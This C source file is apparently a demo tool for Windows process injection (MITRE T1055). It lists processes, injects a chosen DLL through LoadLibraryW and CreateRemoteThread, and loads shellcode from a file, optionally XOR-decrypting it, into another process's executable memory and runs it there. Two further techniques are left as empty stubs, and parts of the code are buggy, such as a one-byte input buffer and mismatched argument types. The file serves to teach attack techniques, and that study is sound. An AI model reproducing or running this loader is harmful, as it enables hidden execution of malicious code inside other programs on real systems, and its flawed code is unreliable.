#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>


VOID GetProcessList()
{
	HANDLE hSnapshot = NULL;
	DWORD dwProcId = NULL;

	PROCESSENTRY32 Proc = {
		.dwSize = sizeof(PROCESSENTRY32)
	};


	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		printf("[!] ERROR: Creating Snapshot failed with error (%d)\n", GetLastError());
		goto _ErrCleanup;
	}

	if (!Process32First(hSnapshot, &Proc)) {
		printf("[!] ERROR: Enumerating snapshot failed with error: (%d)n", GetLastError());
		goto _ErrCleanup;
	}




	do {
		wprintf(L"%d | %s\n", Proc.th32ProcessID, Proc.szExeFile);


	} while (Process32Next(hSnapshot, &Proc));


	CloseHandle(hSnapshot);


_ErrCleanup:
	if (hSnapshot != NULL)
		CloseHandle(hSnapshot);
	return;

}


CHAR *ReadShellcode(LPCSTR filePath, DWORD* size) 
{
	HANDLE hFile = CreateFileA(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "Unable to open file: %s\n", filePath);
		return NULL;
	}

	*size = GetFileSize(hFile, NULL);
	if (*size == INVALID_FILE_SIZE) {
		fprintf(stderr, "Error getting file size\n");
		CloseHandle(hFile);
		return NULL;
	}

	char* buffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *size);
	if (!buffer) {
		fprintf(stderr, "Memory allocation error\n");
		CloseHandle(hFile);
		return NULL;
	}

	DWORD bytesRead;
	if (!ReadFile(hFile, buffer, *size, &bytesRead, NULL) || bytesRead != *size) {
		fprintf(stderr, "Error reading file\n");
		HeapFree(GetProcessHeap(), 0, buffer);
		CloseHandle(hFile);
		return NULL;
	}

	CloseHandle(hFile);
	return buffer;
}


VOID DecryptShellcode(OUT unsigned char* shellcode, IN int shellcode_len) {
	unsigned char key = 0x01;
	int i = 0;

	for (size_t j = 0; j < shellcode_len; j++) {
		if (key > 0xf0) {
			key = 0x01;
			i = 0;
		}

		printf("0x%x ^ 0x%x = 0x%x\n", shellcode[j], key, shellcode[j] ^ key);

		shellcode[j] ^= key;

		key = key + i;
		i += 1;
	}
}



VOID DllInjection(IN DWORD* dwPid)
{
	LPWSTR szDllPath = (LPWSTR)malloc(256 * sizeof(WCHAR));
	LPVOID pLoadLibraryW = NULL;
	LPVOID pRemoteMemoryAddr = NULL;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	DWORD dwSize = 0;
	SIZE_T lpBytesWritten = 0;


	// Explanation
	puts("---------- STEP 3 - SELECTING A DLL TO INJECT ----------");
	puts("- LoadLibraryW will be loaded and executed inside of the target process, effectively loading the DLL specified.\n");


	// Select DLL File

	printf("Enter the path of your DLL: ");

	wscanf_s(L"%255s", szDllPath);

	size_t len = wcslen(szDllPath);
	if (len > 0 && szDllPath[len - 1] == L'\n') {
		szDllPath[len - 1] = L'\0';
	}

	if (lstrlenW(szDllPath) < 3) {
		printf("[!] ERROR: Invalid DLL file path (%d)\n", GetLastError());
		goto _Cleanup;
	}

	dwSize = lstrlenW(szDllPath) * sizeof(WCHAR);

	wprintf(L"[i] INFO: Selected DLL: %s (%lu bytes)\n", szDllPath, dwSize);

	Sleep(1000);



	// Getting Address of LoadLibraryW from Kernel32.dll

	pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	if (pLoadLibraryW == NULL) {
		printf("[!] ERROR: Failed to get address of LoadLibraryW from kernel32.dll (%lu)\n", GetLastError());
		goto _Cleanup;
	}

	printf("[+] SUCCESS: Found address of LoadLibraryW inside of Kernel32.dll: 0x%x\n", pLoadLibraryW);

	Sleep(1000);



	// Getting Process Handle

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);

	if (hProcess == NULL) {
		printf("[!] ERROR: Failed to get process handle for pid [%lu] (%lu)\n", dwPid, GetLastError());
		goto _Cleanup;
	}

	printf("[+] SUCCESS: Obtained handle for process [%lu]\n", dwPid);

	Sleep(1000);



	// Allocating Virtual Memory inside the target process

	pRemoteMemoryAddr = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pRemoteMemoryAddr == NULL) {
		printf("[!] ERROR: Failed to allocate remote memory for pid [%lu] (%d)\n", dwPid, GetLastError());
		goto _Cleanup;
	}

	printf("[+] SUCCESS: Allocated virtual memory with base address 0x%x\n", pRemoteMemoryAddr);

	Sleep(1000);



	// Confirm Injection

	wprintf("[#] DLL \"%s\" ready for injection into PID [%lu]. Press <Enter> to start injection...", szDllPath, dwPid);
	getchar();


	Sleep(2000);


	// Inject the DLL File Path

	if (!WriteProcessMemory(hProcess, pRemoteMemoryAddr, szDllPath, dwSize, &lpBytesWritten) || lpBytesWritten != dwSize) {
		printf("[!] ERROR: Writing to remote memory failed (%d)\n", GetLastError());
		goto _Cleanup;
	}

	printf("[+] SUCCESS: DLL Path was successfully written into remote memory (%d of %d bytes written)\n", lpBytesWritten, dwSize);

	Sleep(1000);



	// Creating remote thread

	hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pRemoteMemoryAddr, NULL, NULL);
	if (hThread == NULL) {
		printf("[!] ERROR: Creating remote thread failed (%d)\n", GetLastError());
		goto _Cleanup;
	}

	wprintf("[+] SUCCESS: Successfully created remote thread with start routine LoadLibraryW (0x%x) with parameter \"%s\" (0x%x) \n", pLoadLibraryW, szDllPath, pRemoteMemoryAddr);


	printf("[#] The test was completed successfully, press <Enter> to exit...\n");
	getchar();

	goto _Cleanup;

_Cleanup:
	if (hProcess != NULL)
		CloseHandle(hProcess);
	if (hThread != NULL)
		CloseHandle(hThread);
	if (szDllPath != NULL)
		free(szDllPath);
	return;
}







VOID PeInjection(IN DWORD* dwPid)
{
	char filePath[MAX_PATH];
	char cResponse[1];
	DWORD dwShellcodeSize = 0;


	PVOID pRemoteMemory = NULL;

	SIZE_T sNumberOfBytesWritten = NULL;
	DWORD dwOldProtection = NULL;

	HANDLE hProcess;


	// Explanation
	puts("---------- STEP 3 - SELECTING A PE TO INJECT ----------");
	puts("- Shellcode will be read from a file, injected into the target process memory and then executed inside of a thread.\n");


	// Get Shellcode file

	printf("[#] Enter the path of your shellcode file: ");
	scanf_s("%259s", filePath);

	PBYTE sTempBuf = ReadShellcode(filePath, &dwShellcodeSize);
	if (!sTempBuf) {
		return 1;
	}
	
	PBYTE pShellcode = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwShellcodeSize);
	if (!pShellcode) {
		printf("[!] ERROR: Failed to allocate memory for shellcode (error: %d)\n", GetLastError());
		HeapFree(GetProcessHeap(), 0, sTempBuf);
		return 1;
	}

	CopyMemory(pShellcode, sTempBuf, dwShellcodeSize);
	HeapFree(GetProcessHeap(), 0, sTempBuf);

	printf("[i] INFO: Shellcode stored in memory at 0x%p\n", pShellcode);


	// Decrypt Shellcode if necessary

	printf("[#] Has the shellcode been XOR encrypted? (Y/n): ");
	scanf_s("%s", cResponse);

	if (strcmp(cResponse, "y") == 0)
		DecryptShellcode(pShellcode, dwShellcodeSize);


	// Open remote process handle

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);

	if (hProcess == NULL) {
		printf("[!] ERROR: Failed to get process handle for pid [%lu] (error: %lu)\n", dwPid, GetLastError());
	}

	printf("[+] SUCCESS: Obtained handle for process [%lu]\n", dwPid);

	Sleep(1000);



	// Allocate remote memory

	pRemoteMemory = VirtualAllocEx(hProcess, NULL, dwShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pRemoteMemory == NULL) {
		printf("[!] ERROR: Failed to allocate remote memory (error: %d)\n", GetLastError());
		return FALSE;
	}

	printf("[i] INFO: Allocated remote memory at : 0x%p \n", pRemoteMemory);



	// Write the shellcode in the allocated memory
	if (!WriteProcessMemory(hProcess, pRemoteMemory, pShellcode, dwShellcodeSize, &sNumberOfBytesWritten) || sNumberOfBytesWritten != dwShellcodeSize) {
		printf("[!] ERROR: Failed to write remote memory (error: %d)\n", GetLastError());
		return FALSE;
	}
	printf("[i] INFO: %d Bytes were written to remote memory\n", sNumberOfBytesWritten);

	memset(pShellcode, '\0', dwShellcodeSize);
	HeapFree(GetProcessHeap(), 0, pShellcode);


	// Change the protection options to make the memory executable
	if (!VirtualProtectEx(hProcess, pRemoteMemory, dwShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] ERROR: Could not update protection options to execute/readwrite (error: %d) \n", GetLastError());
		return FALSE;
	}


	// Create remote thread
	if (CreateRemoteThread(hProcess, NULL, NULL, pRemoteMemory, NULL, NULL, NULL) == NULL) {
		printf("[!] ERROR: Could not start remote thread (error: %d)\n", GetLastError());
		return FALSE;
	}


	printf("[#] The test was completed successfully, press <Enter> to exit...\n");
	getchar();
}


































VOID ThHijacking(IN DWORD* dwPid)
{
	


}

VOID ApcHijacking(IN DWORD* dwPid)
{
	


	return;
}







int main()
{
	DWORD dwProcessId = 0;
	DWORD dwTechnique = 0;
	int iOption = 0;




	// Welcome Screen

	puts("========== WELCOME ==========");
	puts("- This is a technical demo showcasing sub-techniques of T1055 Process Injection created by Richard Minder (minder-security.ch).");


	// CHAPTER 1 - Selecting a target Process
	printf("\n" \
		"---------- STEP 1 - SELECTING A TARGET PROCESS ----------\n" \
		"\n" \
		"\n" \
		"PID | Process Name\n" \
		"-------------------\n");

	GetProcessList();

	printf("\n\nEnter a valid PID, enter 0 to exit: ");
	scanf_s("%lu", &dwProcessId);

	if (dwProcessId < 1)
		goto _GoodBye;



	// Chapter 2 - Selecting a Technique

	printf("\n" \
		"---------- STEP 2 - SELECTING AN INJECTION TECHNIQUE ----------\n" \
		"\n" \
		"[1] - Dynamic-link Library Injection (T1055.001)\n" \
		"[2] - Portable Executable Injection (T1055.002)\n" \
		"[3] - Thread Execution Hijacking (T1055.003)\n" \
		"[4] - Asynchronous Procedure Call (T1055.004)\n");

	printf("\nSelect a technique: ");
	scanf_s("%lu", &dwTechnique);

	switch (dwTechnique) {
	case 1:
		DllInjection(dwProcessId);
		break;
	case 2:
		PeInjection(dwProcessId);
		break;
	case 3:
		ThHijacking(dwProcessId);
		break;
	case 4:
		ApcHijacking(dwProcessId);
		break;
	default:
		goto _GoodBye;
		break;

	}

	return 0;


_GoodBye:
	puts("\n- Goodbye!\n");
	return 0;
}